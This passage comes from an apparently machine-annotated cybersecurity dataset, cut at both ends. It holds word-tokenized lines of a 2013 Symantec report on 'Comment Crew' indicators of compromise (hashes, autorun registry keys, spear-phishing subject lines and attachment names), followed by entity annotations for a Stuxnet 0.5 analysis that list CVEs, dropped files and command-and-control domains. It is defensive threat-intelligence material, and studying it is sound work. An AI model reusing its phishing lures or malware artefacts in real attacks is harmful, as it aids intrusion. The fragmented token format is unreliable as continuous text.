["9157d078effa4b727180c40bedb74ef6", "920dffe40787f1f3fdb24548b4a210db", "92785f445f366ed548388b1af6b01f9c"], ["9327f1eefb18fde7f622fc2efbbbdb4b"], ["939e07685fec28a15f88786b097bb14b", "9400950fa381ba1750c914fa9e6fd85e"], ["942b1ca8c3c64be1e4c40e26c9e39ad8", "962c52436706b5c226894de0436b860e", "96ee5acbe155f37ff1604b4fd259e55f"], ["96f31d6fda587b43887e846876e5c399"], ["975c718bf93ca5d0693bb0d4c7e42d1e", "99b58e416c5e8e0bcdcd39ba417a08ed"], ["9a58902740c5b73eb6a68a126ac6ac55"], ["9a847c1f54359ffd3c335e97600f6f5d", "9aca099f7cd3b3b29551b67af48467d1"], ["9be590614e2407dc144ad6c100a2873a", "9bf4683c09a2d60294ff79ce026f4e64", "9cc15358d6ce18150dbee6be3281151d", "9cd1e3b67540bdc2fc4a3835e170bc65", "9e6b8b265f05302eca455ce8ea10a3aa"], ["9fcb233ee18df6c19b1ad3922dd41a2a"], ["9fd0e94fce1543b75b44414a61b252b0"], ["a01ea69e4c10721ec088676cef67d8bd", "a19e68e72084d867a39776faaa6f5fce", "a1fa946523928c16340cf40daa2ffb53"], ["a26a85c33ddf57d720040629931be174", "a4847e655c817e3c5112e888a2877f4d"], ["a4d476fb7b084bd01a847ab7e0d839b5", "a55f6c8b795ccdc469b9b67b22ddc88b", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "10", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "a637ea307380ba21a355c3cffd37639a", "a6cba31fcca49ff9ed6fd9894644de9e", "a76f0fada1602e9c119cba24306442b4"], ["a98d2c90b9494fc885c7cd35d43666ea", "a9c20499d43f9674cc37dbfa81381203"], ["a9d2caa6ebbfd5be071748e59e754cf4", "a9e0a604e5b8ed5f4f286c3355d7a0fb", "aaa01f776acabdf9f07ea3eaff1695d6", "ac2b219ede57f9d14cdce38e987862aa", "ac9e0b2af215821f7223b6eaeaea03db"], ["ad95f613fc4b644bd5e3230eb0b5dbcc"], ["adb97252b05a6e82697bf93c347bdf25", "aea5dc22e706c836d056f4ba1f13dea3", "af285fa9a141f422b8ccbfb4e9a00054", "b18cabead7248e8156230c71399b79c9", "b19ef1134f54b4021f99cc45ae1bc270", "b1c540b4b9c8a87a1e87a76ed289f18d", "b2784e4dc6e602d9d6bf09325bba8c4e", "b29556856203049b9e7b05e01f5ae73f", "b3056919871fc01a1ed3294e2014e0c4", "b41c02eb41070e0a2e459abf2fc39b69", "b44cd1fa5d8beb08519bbe0c1d796b0f", "b457372a87597b746ce69e05c4a7d3fa", "b653012d2bfa4e3419d97eb9f2e5ed4a", "b665ea35f8f7954657eed1e54517843d", "b68eadb2a8069c7e88535e1ebfb4be0a", "b8c83b3549ebb24b3e00dd23c2aa050a", "b8f77674d292d205f8f5cf6c3f3c34df", "b8fdf06f78341581870477574e2b08c3", "b921e0d11127af9613804c63cddd86ca", "b9367aba4f267b82a838223df016bd6b", "b96b79f4f1b4306ac2c63fc988305fb0", "ba700e3a83fec3cc984e1fb572aa0add", "bbb4bdd1d7e8589d145163f1efd458f5", "bbbf285e8344f7df330f93c7c3baf27f", "bbccf8643368c80dd083fb92d67d00be", "bbdce1e1991f292d366097a743da3724", "bcc6addece28265390b2d535d65c49b8"], ["bd6481ed6dfe67ba9f2f8f26e2cee722", "bdf512d5eef853d07c0db345345e3db7", "be3799da210edb81143d609e66e5b7ff", "be54e3660bf928b8b5f764f5cdfdc4da", "bf18ef997b7d589f031f47799a33f27b", "bf65727accaa53d65c31ed5b582053c5", "bf778439895829ff986207900bfcfe02", "c1438390098e4dc7bb8b52efcf1d2465"], ["c1919e6f2e05feb9dc9b6ab9f81dcb2f", "c243a7c1cf23b91f73100bb9e947439e", "c32696b255bac4b849fc249e56944a91", "c376aecf43bf021b6408ca99cd31da01", "c5062bbbb15911a63de77a66773874d9", "c63cc0a8b0b3a70f7b835a3fff9f02a5", "c8607553e37cc1fc870572670c1910f5", "c89d4d40e4b68a9952121b62b0dda920", "c9570396c897e02ec8aa195c6241f945", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "11", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "c9a32616f89dc953486bd1b5d83359ec", "c9b4c4d65298dc10be6784d0f0ad8519", "c9f19071bac9d4eb3b08b4017c0d9c4d", "cac3bc3039cd73935051ad8df2e53d34", "cb40ff3b3ed8c1966defbe1dafdd1326", "cca75af9786d7364866f40b80dddcc5c", "cd5f3dbea197dc5afb673e42f0e9c3fe", "cdc0c4fdc649dec017ace0f2898068d0", "cec766518fa5b607157e92e9c24c0d03"], ["cf5356cdf42d264d5213cce4cd415f0b", "cf96139290c09963a32506cd85825ed3", "d3174652816010a7f6d8f4523ee3a077", "d4036f03c760084cc677edf4ee6c4a39", "d46d261ec92daf703cd584f10037198c", "d5027d35c8bd9e867113bd4a1edb931f", "d58323fb222b9ff681c0982ba286a296", "d6b1989d9c271b8575326e4fca159ae8", "d6b198eda724e2b3367502a6a2232939", "d6b467c92256094f720e9fc75f149737"], ["d6d5aeb79899485f5734bf8847782266", "d6e98d062d7900c6fe9a6d7f0b1d7fec", "d6ff4333eb1a2305d5b6cf4705213393", "d795292ea23217480ad92939daf6dd22", "d83055efe66377067ce99d99c706f19a", "d8f7aaad3677fac1cde911c7362c2b69", "d910d21bd54b63ef61b3f250fe73dcc6", "da451674bb68804b390bd7413691c91e", "dab17bcceae6f32eae5d800d0d3f9e46", "db6ae6da64f14168b3624e26191277cf", "db7d3724e5f004168a1a56f6b9de3cd5", "dd5aad5d66bc96e5ac60cbe5d132c2ec", "de5eeb9847a5fbc1a6cbb4cfb8bb6aa0", "df53ce3797932d9e62ceaa760a3f0e3e", "dfaa6250dc947602d5dc200e503f23a5", "dff3a274e5fa35013601c7985bf13d56", "dff7ac111e48115e208c2649b94b1115"], ["e0b3a0fd042ff50e0de22725864775b8", "e1117ec1ea73b6da7f2c051464ad9197", "e2494eba419891c0c101af74eb8c029c", "e2620e1cf89830e8de1e8c4530829a15", "e27f0975fd3278e7303102783767c508", "e2a557b39231ee91724c150e3ec4b493"], ["e2be37df12f7b98b2b73197d77773263"], ["e4255f51a871a95baa10b6b2c4ed2470"], ["e62bb947d72d12311890f2e07eb6ac8b", "e6446d52e9f4b5c2c5a9ac850281cae8", "e649b8b9e541406446da47d8d0a91385", "e6ffb1c6e1508f474a69f091435454ce", "e85863b1de035814b4b01a2b6c477dd1", "e90b037f1cbc79796fd8b1f6382c8483", "e93a4f4872bf6cd8c3f0eed6017a8d41", "ea823850b777993d636e4a565568f734", "ead35eab94820d5a34f185d0b26b7930", "ebe291e968eb5a86b4963d27352bc525", "eced29c71867e375aed0da408d6b07f4", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "12", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here"], ["ed665cf8a48f08f8b4fed8bbf9d2d998", "ee998128e20971ca4296a8a73ed79f43", "eea7ae4eb726c3e05f187110090adb18", "ef10f4f11032d48f7e82c0a788c0f489", "efaadcfa4271c50927ab817e0c4a0bc3", "f0a00cfd891059b70af96b807e9f9ab8", "f15cff24d8a3a9ffce590cc8e69baec9", "f1c4b919fdf008a8400189562f5e2fba", "f29cb80bde4af21c226596e9d125795d"], ["f2f2cad79dcfb356db7b2485c7a27f03", "f643fa851203e9159c9dc50e4ab8d81e", "f74ec871c77e4b5e5b2ae0917b1f0f21"], ["f7820d429d3185ad00e6758c343e29ce", "f82d3b270b16780044817978f4f3fe1a", "f9d2c3e8f81b9c44a1837478b2a98e5e", "fb0b900de6d286321fd6d20c6c4f5679", "fbb0c14cacc60fdd393fb5889d5a0b57", "fc97b89541b149e0dd9937ba876b3ee1", "fd130b2bce93caf18bc23f1526daae99", "fd31f952637370a30d74c2a65ba8d2cd", "fd9b5c35c042a6c462187067fb869aac", "fde5e109bfab33964564f387f8940030", "fe568a370aa3d2c78125ab37c16484d1", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "13", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "System", "indicators"], ["System", "based", "indications", "of", "possible", "compromise", "by", "the", "comment", "crew", "attackers", "."], ["Registry", "entries", ":", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Acroread", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Adobe", "Update", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeCheck", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeCom", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"IMSCMig", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"McUpdate", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"Register", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"SysTray", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"systemupdate", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"wininstaller", "\"", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"APVSVC", "\"", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"AdobeUpdate", "\"", "Service", "names", ":", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "aec", "elpmasym", "Net", "CLR", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "14", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "Email", "indicators"], ["Email", "based", "indications", "of", "possible", "compromise", "by", "the", "comment", "crew", "attackers", "."], ["Subject", "lines", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Capt", "[", "REMOVED", "]", "update"], ["Fw", ":", "LES", "Request"], ["Libya", "crisis"], ["Five", "Simple", "Questions", "for", "Democrats", "on", "Spending", "Cuts", "Behind", "the", "Easing", "of", "Israeli", "-", "Palestinian", "Tensions", "Business", "Exec", "Urges", "Broad", "Trade", "Agenda", "To", "Curb", "China", "Role", "In", "Latin", "America", "President", "Chavezs", "Comments", "About", "President", "Obama", "and", "the", "United", "States", "on", "Sundays", "\"", "Alo", ",", "Presidente", "\"", "FW", ":", "New", "Standdard", "Operational", "Procedures", "(", "SOPs", ")", "between", "the", "AGENDA"], ["[", "REMOVED", "]", "Help", "You", "Save", "Enough", "for", "Retirement"], ["Human", "right", "of", "north", "Afica", "under", "war"], ["Spreading", "Civil", "Unrest", "in", "the", "Middle", "East", "and", "North", "Africa"], ["The", "latest", "analysis", "on", "Syria", "International", "Atomic", "Energy", "Agency", "invite", "you", "to", "attend", "Atomic", "Energy", "Summit", "GAC", "Monthly", "Report", "Emergency", "notification"], ["Meeting", "information", "of", "[", "REMOVED", "]"], ["Meeting", "information", "of", "[", "REMOVED", "]"], ["Meeting", "notice", "from", "[", "REMOVED", "]"], ["Meeting", "notice", "from", "[", "REMOVED", "]"], ["FY12", "Government", "Opportunities", "Yemen", "para", "for", "SC", "briefing", "Fighting", "Protectionism", "and", "Promoting", "Trade", "and", "Investment", "Weekly", "Security", "Report", "Agenda", "of", "[", "REMOVED", "]", "Visit", "in", "July", "2011", "Agenda", "of", "[", "REMOVED", "]", "Visit", "in", "July", "2011", "Obituary", "Notice", "Updated", "Roster", "20110712", "2011", "project", "budget"], ["[", "REMOVED", "]", "National", "Security", "Seminar"], ["Current", "internatinal", "situation", "surrounding", "Syria", "New", "Update", "of", "Health", "&", "Medical", "force"], ["FW", ":", "How", "to", "Get", "Free", "Airline", "Tickets", "Nuclear", "Security", "and", "Summit", "Diplomacy"], ["Fw", ":", "[", "REMOVED", "]", "Defence", "&", "Security", "Industry", "Mission", "to", "[", "REMOVED", "]", "201"], ["[", "REMOVED", "]", "heriketlik", "pilani", "2012", "Global", "aerospace", "and", "defense", "industry", "outlook", "Email", "attachment", "names", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "update.exe", "CTF", "2011", "(", "MF).xls", "BBC", "Monitoring", "reports", ".."], ["xls", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "15", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "Five", "Simple", "Questions", "for", "Democrats", "on", "Spending", "Cuts.doc", "Behind", "the", "Easing", "of", "Israeli", "-", "Palestinian", "Tensions.doc", "Business", "Exec", "Urges", "Broad", "Trade", "AgendaTo", "Curb", "China", "Role", "In", "Latin", "America.doc", "PatriotLMSR2009Fin", ".doc"], ["New", "SOPs", "for", "HEC", "Coord", "with", "NATO.pdf"], ["agenda201005.pdf", "Human", "right", "report", "of", "noth", "Afica", "under", "the", "war.scr", "Middle_East_Civil_Unrest.pdf", "Protests", "Spread", "in", "Syria.pdf", "Cybersecurity", "and", "Cyber", "War.pdf"], ["The", "Meeting", "intivation", "of", "International", "Atomic", "Energy", "Agency", "06-05-2011.scr", "meeting", "invitation", "of", "British", "Council", "2011.scr"], ["Meeting", "information", "details", "of", "[", "REMOVED].exe"], ["Meeting", "information", "details", "of", "[", "REMOVED].exe", "Meeting", "detail", "information", "from", "[", "REMOVED].scr", "Meeting", "detail", "information", "from", "[", "REMOVED].scr", "FY12", "Government", "Opportunities.pdf"], ["China", "'s", "Jasmine", "protests.pdf", "Yemen", "para", "for", "SC", "briefing.doc", "DECLARATION-", "COMMENTS.Netherlands.pdf", "weekly_security_report-06-20-2011__-__06-26-2011.pdf", "2011.xls", "Obituary.xls", "Updated_roster.xls", "2011", "project", "budget.xls", "Participant_Contacts.xls"], ["Current", "international", "situation", "surrounding", "Syria.doc"], ["Update", "of", "Health", "&", "Medical", "force.xls", "How", "to", "Get", "Free", "Airline", "Tickets.pdf", "REPLY", "_", "FORM.doc"], ["Global", "A&D", "outlook", "2012.pdf", "Global_A&D_outlook_2012.pdf", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "16", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "References", "Mandiant", "Indicators", "of", "Compromise", "http://intelreport.mandiant.com/Mandiant_APT1_Report_Appendix.zip", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "17", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "About", "Symantec", "Symantec", "protects", "the", "world", "\u2019s", "information", "and", "is", "the", "global", "leader", "in", "security", ",", "backup", ",", "and", "availability", "solutions", "."], ["Our", "innovative", "products", "and", "services", "protect", "people", "and", "information", "in", "any", "environment", "\u2014", "from", "the", "smallest", "mobile", "device", "to", "the", "enterprise", "data", "center", "to", "cloud", "-", "based", "systems", "."], ["Our", "industry", "-", "leading", "expertise", "in", "protecting", "data", ",", "identities", ",", "and", "interactions", "gives", "our", "customers", "confidence", "in", "a", "connected", "world", "."], ["More", "information", "is", "available", "at", "www.symantec.com", "or", "by", "connecting", "with", "Symantec", "at", "go.symantec.com/socialmedia"], ["Headquartered", "in", "Mountain", "View", ",", "Calif.", ",", "Symantec", "has", "operations", "in", "40", "countries", "."], ["More", "information", "is", "available", "at", "www.symantec.com"], ["For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "website", "."], ["Symantec", "World", "Headquarters", "350", "Ellis", "St.", "Mountain", "View", ",", "CA", "94043", "USA"], ["+1", "(", "650", ")", "527", "-", "8000", "1", "(", "800", ")", "721", "-", "3934", "www.symantec.com", "Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec", "Corporation", "."], ["NO", "WARRANTY", "."], ["The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", "."], ["Any", "use", "of", "the", "technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", "."], ["Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical", "errors", "."], ["Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["Copyright", "\u00a9", "2013", "Symantec", "Corporation", "."], ["All", "rights", "reserved", "."], ["Symantec", ",", "the", "Symantec", "Logo", ",", "and", "the", "Checkmark", "Logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the", "U.S.", "and", "other", "countries", "."], ["Other", "names", "may", "be", "trademarks", "of", "their", "respective", "owners", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "18"]]}, {"vertexSet": [[{"name": "2010", "pos": [1, 2], "sent_id": 10, "type": "Time"}], [{"name": "Symantec", "pos": [3, 4], "sent_id": 10, "type": "Organization"}], [{"name": "Stuxnet", "pos": [13, 14], "sent_id": 10, "type": "Malware"}], [{"name": "Stuxnet", "pos": [22, 23], "sent_id": 14, "type": "Malware"}], [{"name": "Symantec", "pos": [0, 1], "sent_id": 16, "type": "Organization"}], [{"name": "Stuxnet", "pos": [8, 9], "sent_id": 16, "type": "Malware"}], [{"name": "Stuxnet", "pos": [18, 19], "sent_id": 16, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [22, 24], "sent_id": 17, "type": "Malware"}], [{"name": "Stuxnet", "pos": [28, 29], "sent_id": 17, "type": "Malware"}], [{"name": "November 2007", "pos": [40, 42], "sent_id": 17, "type": "Time"}], [{"name": "November 2005", "pos": [48, 50], "sent_id": 17, "type": "Time"}], [{"name": "Stuxnet 0.5", "pos": [0, 2], "sent_id": 19, "type": "Malware"}], [{"name": "Stuxnet", "pos": [6, 7], "sent_id": 19, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [0, 2], "sent_id": 21, "type": "Malware"}], [{"name": "Natanz, Iran", "pos": [16, 19], "sent_id": 21, "type": "Location"}], [{"name": "Stuxnet 0.5", "pos": [9, 11], "sent_id": 22, "type": "Malware"}], [{"name": "Stuxnet", "pos": [20, 21], "sent_id": 22, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [49, 51], "sent_id": 22, "type": "Malware"}], [{"name": "Stuxnet", "pos": [3, 4], "sent_id": 23, "type": "Malware"}], [{"name": "Stuxnet", "pos": [5, 6], "sent_id": 24, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [7, 9], "sent_id": 24, "type": "Malware"}], [{"name": "November 2007", "pos": [9, 11], "sent_id": 25, "type": "Time"}], [{"name": "November 2005", "pos": [0, 2], "sent_id": 26, "type": "Time"}], [{"name": "July 4, 2009", "pos": [10, 14], "sent_id": 27, "type": "Time"}], [{"name": "January 11", "pos": [38, 40], "sent_id": 27, "type": "Time"}], [{"name": "2001", "pos": [20, 21], "sent_id": 28, "type": "Time"}], [{"name": "November 3, 2005", "pos": [2, 6], "sent_id": 29, "type": "Time"}], [{"name": "November 15, 2007", "pos": [9, 13], "sent_id": 29, "type": "Time"}], [{"name": "July 4, 2009", "pos": [7, 11], "sent_id": 30, "type": "Time"}], [{"name": "June 22, 2009", "pos": [14, 18], "sent_id": 30, "type": "Time"}], [{"name": "March 1, 2010", "pos": [22, 26], "sent_id": 30, "type": "Time"}], [{"name": "April 14, 2010", "pos": [30, 34], "sent_id": 30, "type": "Time"}], [{"name": "June 24, 2012", "pos": [38, 42], "sent_id": 30, "type": "Time"}], [{"name": "Stuxnet", "pos": [49, 50], "sent_id": 30, "type": "Malware"}], [{"name": "CVE-2010-3888", "pos": [6, 9], "sent_id": 31, "type": "Vulnerability"}], [{"name": "CVE-2010-2729", "pos": [7, 10], "sent_id": 32, "type": "Vulnerability"}], [{"name": "CVE-2008-4250", "pos": [16, 19], "sent_id": 32, "type": "Vulnerability"}], [{"name": "CVE-2010-2743", "pos": [1, 4], "sent_id": 34, "type": "Vulnerability"}], [{"name": "CVE-2012-3015", "pos": [4, 7], "sent_id": 34, "type": "Vulnerability"}], [{"name": "CVE-2010-2772", "pos": [8, 11], "sent_id": 34, "type": "Vulnerability"}], [{"name": "CVE-2010-2568", "pos": [0, 3], "sent_id": 35, "type": "Vulnerability"}], [{"name": "MS09-025", "pos": [3, 6], "sent_id": 35, "type": "Vulnerability"}], [{"name": "Stuxnet", "pos": [16, 17], "sent_id": 35, "type": "Malware"}], [{"name": "Stuxnet", "pos": [26, 27], "sent_id": 35, "type": "MalwareFamily"}], [{"name": "Stuxnet 0.5", "pos": [6, 8], "sent_id": 36, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [19, 21], "sent_id": 43, "type": "Malware"}], [{"name": "Flamer", "pos": [26, 27], "sent_id": 43, "type": "Malware"}], [{"name": "Tilded", "pos": [36, 37], "sent_id": 43, "type": "Malware"}], [{"name": "Tilded", "pos": [12, 13], "sent_id": 44, "type": "Malware"}], [{"name": "Tilded", "pos": [12, 13], "sent_id": 45, "type": "Malware"}], [{"name": "Flamer", "pos": [2, 3], "sent_id": 46, "type": "Malware"}], [{"name": "Tilded", "pos": [4, 5], "sent_id": 46, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [0, 2], "sent_id": 47, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [4, 6], "sent_id": 48, "type": "Malware"}], [{"name": "s7hkimdb.dll", "pos": [17, 18], "sent_id": 48, "type": "File"}], [{"name": "XR000001.MDX", "pos": [19, 20], "sent_id": 48, "type": "File"}], [{"name": "CVE2012-3015", "pos": [13, 16], "sent_id": 49, "type": "Vulnerability"}], [{"name": "S7hkimdb.dll", "pos": [19, 20], "sent_id": 49, "type": "Dropper"}], [{"name": "XR00001.MDX", "pos": [31, 32], "sent_id": 49, "type": "File"}], [{"name": "Stuxnet", "pos": [32, 33], "sent_id": 49, "type": "Malware"}], [{"name": "Stuxnet", "pos": [12, 13], "sent_id": 51, "type": "Malware"}], [{"name": "outbreak.dll", "pos": [8, 9], "sent_id": 52, "type": "Indicator"}], [{"name": "oem7a.pnf", "pos": [15, 16], "sent_id": 52, "type": "Indicator"}], [{"name": "installation.dll", "pos": [11, 12], "sent_id": 53, "type": "File"}], [{"name": "oem7w.pnf", "pos": [17, 18], "sent_id": 53, "type": "File"}], [{"name": "MRXCLS.SYS", "pos": [7, 8], "sent_id": 54, "type": "Indicator"}], [{"name": "Stuxnet", "pos": [23, 24], "sent_id": 54, "type": "Malware"}], [{"name": "PCIBUS.SYS", "pos": [4, 5], "sent_id": 58, "type": "Indicator"}], [{"name": "USBACC11.SYS", "pos": [4, 5], "sent_id": 59, "type": "Indicator"}], [{"name": "Stuxnet 0.5", "pos": [19, 21], "sent_id": 61, "type": "Malware"}], [{"name": "XUTILS/links/S7P00001.DBF", "pos": [0, 5], "sent_id": 74, "type": "File"}], [{"name": "XUTILS/listen/S7000001.MDX", "pos": [0, 5], "sent_id": 75, "type": "Payload"}], [{"name": "installation.dll", "pos": [9, 10], "sent_id": 75, "type": "File"}], [{"name": "XUTILS/listen/XR000000.MDX", "pos": [0, 5], "sent_id": 76, "type": "File"}], [{"name": "outbreak.dll", "pos": [10, 11], "sent_id": 76, "type": "File"}], [{"name": "hOmSave7/subfolder/s7hkimdb.dll", "pos": [12, 17], "sent_id": 76, "type": "File"}], [{"name": "inetpsp.dll", "pos": [9, 10], "sent_id": 82, "type": "File"}], [{"name": "netsimp32.dll", "pos": [22, 23], "sent_id": 82, "type": "File"}], [{"name": "usbacc11.sys", "pos": [6, 7], "sent_id": 83, "type": "Indicator"}], [{"name": "smartclick.org", "pos": [4, 5], "sent_id": 85, "type": "Indicator"}], [{"name": "best-advertising.net", "pos": [5, 6], "sent_id": 85, "type": "Indicator"}], [{"name": "internetadvertising4u.com", "pos": [6, 7], "sent_id": 85, "type": "Indicator"}], [{"name": "ad-marketing.net", "pos": [7, 8], "sent_id": 85, "type": "Indicator"}], [{"name": "January 11, 2009", "pos": [21, 25], "sent_id": 85, "type": "Time"}], [{"name": "July 4, 2009", "pos": [41, 45], "sent_id": 85, "type": "Time"}], [{"name": "2005", "pos": [7, 8], "sent_id": 86, "type": "Time"}], [{"name": "United States", "pos": [10, 12], "sent_id": 90, "type": "Country"}], [{"name": "Canada", "pos": [13, 14], "sent_id": 90, "type": "Country"}], [{"name": "France", "pos": [15, 16], "sent_id": 90, "type": "Country"}], [{"name": "Thailand", "pos": [18, 19], "sent_id": 90, "type": "Country"}], [{"name": "2005", "pos": [9, 10], "sent_id": 91, "type": "Time"}], [{"name": "Stuxnet", "pos": [14, 15], "sent_id": 91, "type": "Campaign"}], [{"name": "Stuxnet 0.5", "pos": [2, 4], "sent_id": 92, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [14, 16], "sent_id": 92, "type": "Malware"}], [{"name": "%WinDir%\\msagent\\agentsb.dll", "pos": [4, 6], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\msagent\\agentsb.dll", "pos": [4, 6], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\msagent\\intl\\agt0f2e.dll", "pos": [6, 8], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\msagent\\intl\\agt0f2e.dll", "pos": [6, 8], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\system32\\complnd.dll", "pos": [8, 10], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\system32\\dllcache\\datacprs.dll", "pos": [10, 12], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\system32\\wbem\\perfnws.dll", "pos": [12, 14], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\Installer\\{6F716D8C-398F-11D3-85E1-005004838609}\\places.dat", "pos": [14, 20], "sent_id": 110, "type": "File"}], [{"name": "%WinDir%\\Installer\\{6F716D8C-398F-11D3-85E1-005004838609}\\places.dat", "pos": [14, 20], "sent_id": 110, "type": "File"}], [{"name": "s7otbxdx.dll", "pos": [4, 5], "sent_id": 112, "type": "File"}], [{"name": "s7aaapix.dll", "pos": [4, 5], "sent_id": 116, "type": "File"}], [{"name": "s7otbxdx.dll", "pos": [8, 9], "sent_id": 117, "type": "File"}], [{"name": "Stuxnet 0.5", "pos": [1, 3], "sent_id": 128, "type": "Malware"}], [{"name": "s7_event", "pos": [0, 1], "sent_id": 129, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_bub_cycl_read_create", "pos": [1, 2], "sent_id": 129, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_bub_read_var", "pos": [2, 3], "sent_id": 129, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_bub_read_var_seg", "pos": [3, 4], "sent_id": 129, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_bub_write_var", "pos": [4, 5], "sent_id": 129, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_bub_write_var_seg", "pos": [0, 1], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_link_in", "pos": [1, 2], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_read_szl", "pos": [2, 3], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_read_szl", "pos": [3, 4], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_test", "pos": [4, 5], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7ag_test", "pos": [5, 6], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_delete", "pos": [6, 7], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_delete", "pos": [7, 8], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_findfirst", "pos": [8, 9], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_findfirst", "pos": [9, 10], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_findnext", "pos": [10, 11], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": 